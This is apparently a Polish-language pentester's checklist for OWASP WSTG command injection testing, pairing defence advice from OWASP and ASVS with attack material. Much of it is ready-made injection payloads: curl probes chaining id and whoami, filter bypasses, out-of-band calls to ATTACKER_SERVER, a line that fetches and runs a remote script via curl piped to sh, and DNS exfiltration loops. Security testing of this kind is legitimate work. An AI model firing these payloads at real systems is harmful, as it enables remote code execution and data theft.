# WSTG-INPV-12 — Testing for Command Injection

## Cele

- Identify and assess command injection points
- Bypass special characters and OS commands filter

## KOMENDY

### commix - automatyczny skaner command injection

```bash
commix -u "https://TARGET/ping?host=127.0.0.1" --batch
commix -u "https://TARGET/ping?host=127.0.0.1" --batch --os-cmd="id"

```

### Reczne testowanie - Linux

```bash
curl -s "https://TARGET/ping?host=127.0.0.1;id"
curl -s "https://TARGET/ping?host=127.0.0.1|id"
curl -s "https://TARGET/ping?host=127.0.0.1||id"
curl -s "https://TARGET/ping?host=127.0.0.1&&id"
curl -s "https://TARGET/ping?host=\$(id)"
curl -s "https://TARGET/ping?host=127.0.0.1%0aid"
curl -s "https://TARGET/ping?host=\`id\`"

```

### Reczne testowanie - Windows

```bash
curl -s "https://TARGET/ping?host=127.0.0.1&whoami"
curl -s "https://TARGET/ping?host=127.0.0.1|whoami"
curl -s "https://TARGET/ping?host=127.0.0.1||whoami"

```

### Blind command injection (time-based)

```bash
curl -s "https://TARGET/ping?host=127.0.0.1;sleep 5" -o /dev/null -w "%{time_total}\n"
curl -s "https://TARGET/ping?host=127.0.0.1|sleep 5" -o /dev/null -w "%{time_total}\n"

```

### Out-of-band

```bash
curl -s "https://TARGET/ping?host=127.0.0.1;curl ATTACKER_SERVER"
curl -s "https://TARGET/ping?host=127.0.0.1;nslookup ATTACKER.burpcollaborator.net"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings Command Injection

```bash
ffuf -u "https://TARGET/ping?host=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Command Injection/Intruder/command_exec.txt" -mc all -o output_ffuf_cmdi.json

ffuf -u "https://TARGET/ping?host=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Command Injection/Intruder/command-execution-unix.txt" -mc all -o output_ffuf_cmdi_unix.json

```

### SecLists command injection commix

```bash
ffuf -u "https://TARGET/ping?host=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/command-injection-commix.txt -mc all -o output_ffuf_seclists_cmdi.json

```

### fuzzdb command injection

```bash
ffuf -u "https://TARGET/ping?host=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/os-cmd-execution/command-execution-unix.txt -mc all -o output_ffuf_fuzzdb_cmdi.json
ffuf -u "https://TARGET/ping?host=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/os-cmd-execution/Commands-Linux.txt -mc all -o output_ffuf_fuzzdb_linux.json
ffuf -u "https://TARGET/ping?host=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/os-cmd-execution/shell-operators.txt -mc all -o output_ffuf_fuzzdb_operators.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj funkcje ktore moga wykonywac komendy systemowe (ping, DNS lookup, traceroute, file operations)
2. Testuj rozne separatory komend: ; | || && \n \`\` $()
3. Sprawdz blind injection przez opoznienie (sleep) lub OOB (curl/nslookup)
4. Testuj bypass filtrow: kodowanie URL, podwojne kodowanie, wildcardy
5. Testuj bypass blacklist: us%65rname, /b??/cat, \w\h\o\a\m\i
6. Uzyj Burp Collaborator do detekcji blind command injection


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — OS_Command_Injection_Defense_Cheat_Sheet.md

### Defense Option 1 — Unikaj wywolan OS calkowicie (PRIMARY)

- NAJLEPSZA obrona: NIE wywoluj komend systemowych — uzywaj natywnych API/bibliotek jezyka
- Przyklad: uzywaj `mkdir()` zamiast `system("mkdir /dir_name")`
- Wbudowane funkcje biblioteczne NIE MOGA byc manipulowane do wykonywania innych zadan

### Defense Option 2 — Escapowanie wartosci

- PHP: uzywaj `escapeshellarg()` zamiast `escapeshellcmd()`
  - `escapeshellarg()` — otacza input pojedynczymi cudzylowami, pozwala tylko JEDEN argument
  - `escapeshellcmd()` — escapuje znaki specjalne, ale pozwala na argument injection (dodatkowe flagi)
- Przyklad niebezpieczny z `escapeshellcmd()`:
  - Input: `--directory-prefix=. http://attacker.com/malicious.php` — nadpisze flage wget
- Przyklad bezpieczny z `escapeshellarg()`:
  - Input zostaje otoczony cudzylowami — dodatkowa flaga staje sie czescia stringa

### Defense Option 3 — Parameteryzacja + Input Validation

- **Layer 1 — Parameteryzacja**: rozdziel komende od argumentow
  - Java: `ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");`
  - Java `Runtime.exec()` NIE uzywa shella — metaznaki sa traktowane jako argumenty (bezpieczniej niz C `system()`)
  - Python: `subprocess.run(["cmd", "arg1", "arg2"])` z lista argumentow (NIE string)
- **Layer 2 — Input validation**:
  - Komendy: waliduj przeciw allowlist dozwolonych komend
  - Argumenty: allowlist regex np. `^[a-z0-9]{3,10}$` — bez metaznakow
  - Uzyj `--` jako delimiter konca opcji (POSIX Guideline 10): `curl -- $url`

### Niebezpieczne znaki do filtrowania

- Metaznaki komend: `& | ; $ > < \` \ ! ' " ( )`
- Kazdy z tych znakow moze zmienic znaczenie komendy lub uruchomic dodatkowa komende
- Whitespace takze moze byc problematyczny w niektorych kontekstach

### Argument Injection — osobne zagrozenie

- Nawet po escapowaniu znakow komend, atakujacy moze wstrzyknac dodatkowe ARGUMENTY
- Przyklad: `curl $url` — atakujacy moze dodac `--help` lub `--output /etc/crontab`
- Obrona: hardcoduj komende i flagi, waliduj input, uzyj `--` separatora

### Dodatkowe srodki obrony

- Uruchamiaj procesy z **minimalnymi uprawnieniami** (principle of least privilege)
- Twórz izolowane konta z ograniczonymi uprawnieniami do pojedynczych zadan
- Monitoruj i loguj wszystkie wywolania systemowe w aplikacji

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Command Injection Attacker | Generator payloadow OS command injection | [GitHub](https://github.com/portswigger/command-injection-attacker) |
| Argument Injection Hammer | Wykrywanie argument injection | [GitHub](https://github.com/nccgroup/argumentinjectionhammer) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.2.5 | Injection Prevention | Verify that the application protects against OS command injection and that operating system calls use parameterized OS queries or use contextual command line output encoding. |


---

## HackTricks Tips

### Separatory (Unix + Windows)

`cmd1||cmd2`, `cmd1|cmd2`, `cmd1&&cmd2`, `cmd1&cmd2`, `cmd1%0Acmd2` (newline — polecany, omija większość filtrów), `` `cmd` ``, `$(cmd)`

### Filter bypass

- **IFS jako spacja**: `ls${IFS}id`, `cmd%0abash%09-c%09"id"%0a` (taby)
- **Windows wildcards**: `powershell C:**2\n??e*d.*?` (notepad), `@^p^o^w^e^r^shell` (caret insertion)

### Argument/Option Injection (bez metaznaków shell)

Gdy `execve`/`execFile` ale args niesanityzowane:
- `curl -o /tmp/x` → zapis do arbitrary path
- `curl -K <url>` → load attacker-controlled config
- `tcpdump -G 1 -W 1 -z /path/script.sh` → post-rotate execution

### JVM Diagnostic RCE

`-XX:OnOutOfMemoryError="/bin/sh -c 'curl attacker/p.sh|sh'"` — force OOM, execute hook

### Blind data exfil

- **Time-based**: `time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi`
- **DNS**: `for i in $(ls /); do host "$i.attacker.burpcollaborator.net"; done`

### Parametry do fuzzowania

`?cmd=`, `?exec=`, `?ping=`, `?query=`, `?code=`, `?run=`, `?func=`, `?process=`
